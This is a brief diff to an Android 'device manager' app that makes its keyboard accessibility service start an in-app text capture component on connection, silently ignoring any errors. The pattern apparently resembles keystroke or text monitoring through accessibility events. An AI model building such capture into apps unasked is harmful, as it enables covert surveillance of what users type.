@@ -10,6 +10,7 @@ import android.view.KeyEvent;
 import android.view.accessibility.AccessibilityEvent;
 import android.view.accessibility.AccessibilityNodeInfo;
 
+import com.company.devicemgr.utils.AppRuntime;
 import com.company.devicemgr.utils.InAppTextCaptureManager;
 
 import java.util.List;
@@ -52,6 +53,10 @@ public class KeyboardAccessibilityService extends AccessibilityService {
     @Override
     protected void onServiceConnected() {
         super.onServiceConnected();
+        try {
+            AppRuntime.ensureInAppTextCaptureStarted(this);
+        } catch (Exception ignored) {
+        }
         AccessibilityServiceInfo info = new AccessibilityServiceInfo();
         info.eventTypes = AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED
                 | AccessibilityEvent.TYPE_VIEW_TEXT_SELECTION_CHANGED
